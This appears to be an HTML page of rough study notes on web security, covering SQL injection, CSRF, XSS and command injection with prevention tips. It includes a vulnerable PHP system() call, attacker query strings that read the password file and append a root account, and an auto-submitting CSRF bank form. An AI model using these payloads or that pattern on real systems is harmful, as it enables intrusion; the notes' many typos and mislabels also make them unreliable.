 <html>
  <head>
  	<title>Web Security</title>
  </head>
  <body>
  
  
  <h1>Web Server</h1>
  <p>A Web Server is an entry point for clients to a variety of services. Customized for clients via cookies and  si supported by complex backend application such as databases.</p>
  
  <p>Attackers commonly target web servers through common, protocols. Web servers that suppports a wide range of inputs, complex software interactions and web servers runing with high privileges.</p>
  
  <h3> Three top web site vulnerabilities</h3>

  <p>SQl Injection</p>
    Browser sends malicious input to the server. Bad input chaking leads to maliciuos SQL query. Simpky saying that the SQL is used to  channge the meaning of th database command.
  <p>CSRF- Cross-site scripting</p>
  Bad website sends browsers request to good web site, using credentials of the innocent victim. Leverage user's session at victim server.
  <p>XSS- Cross-site scripting</p>
  bad website send innocent victim a script that steals information from an honest web site. Inject malicious script into trusted context.
  
  <h3>Command Injection</h3>
      <p>Attack goal: executes arbitary code o nthe server</p>
      <p>Example</p>
      <p><b>PHP server-sede code for sending mail</b></p>
      <p>$email = $_POST["emai"]</p>
      <p>$subject = $_POST["subject"]</p>
      <p>system(""mail $email - s $subject < /tmp/joinmynetwork"")</p>
      <p><b>Attacker can post</b></p>
      <p>http://yourdi=omain.com/mail.php?</p>
      <p>   email=hacker@hackerhome.net &</p>
      <p>   subject=foo < /usr/passwd; ls</p>
      <p><b>OR</b></p>
      <p>http://yourdomain.com/mail/php?</p>
      <p>email=hacker@hackerhome.net&subject=foo</p>
      <p>echo "evil::0:0:root:/:/bin/sh">>passwd; ls</p>
<h3>SQL Injection</h3>
      <p><b>Main steps in this attack;</b></p>
      <p>use google to find sites using a particular ASP style vulnerable to sql injection.</p>
      <p>use SQL injection on these sites to modify the pages to include a link to chinese sites nihaorr1.com (don't visit he site.)</p>
      <p>the site serves javasript that exploits vulnerabilitie in IE, RealPlayer, QQ Instant Messenger</p>
      
      <p>Pvention of sql injection</p>
      <p>never build SQL commands yourself</p>
      <p> use parametero=ized.prepared SQL</p>
      <p>use ORM framework</p>
      <p>example</p>
      <p>Build SQL queries by properly escaping args: ' \'</p>
      <p>SQlCOmmand cmd = new SQLCommand(</p>
      <p>"Select * FROM UserTable WHERE username = @User AND password= @Pwd", dbConnection</p>
      <p>cmd.Parameters.ADD("@User", Request["user"]);</p>
      <p>cmdParametes.ADD("@Pwd", Request["pwd"]);</p>
      <p>cmd.ExecuteReader();</p>
<h3>Cross Site Request Forgery</h3>
      <p>Example</p>
      <p>user logs in to bank.com</p>
      <p>Session cookies remians in browser state</p>
      <p>User visits another site containing:</p>
      <p>-form name=F action=http://bank.com/BillPay.php-<br>
        -input name=recipient value=badguy- â€¦<br>
        -script- document.F.submit(); -script-</p>
      <p>Browser send user auth cookies with request</p>
      <p>transaction will fulfilled</p>
      <p>Problem: cookies auth is insufficient when side effect occur</p>
      
  </body>
  </html>